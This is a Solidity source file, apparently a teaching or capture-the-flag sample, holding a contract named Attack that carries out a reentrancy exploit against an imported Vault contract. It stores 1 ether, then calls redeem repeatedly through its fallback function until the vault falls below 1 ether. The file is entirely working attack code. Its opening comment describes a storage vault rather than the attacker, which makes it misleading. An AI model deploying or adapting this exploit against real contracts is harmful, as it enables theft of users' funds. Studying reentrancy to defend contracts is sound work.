// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.13;
import './Vault.sol';

// You can store ETH in this contract and redeem them.
contract Attack {
    Vault public vault;

    constructor(address _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

    fallback() external payable {
        if(address(vault).balance >= 1 ether) {
            vault.redeem();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vault.store{value: 1 ether }();
        vault.redeem();
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}
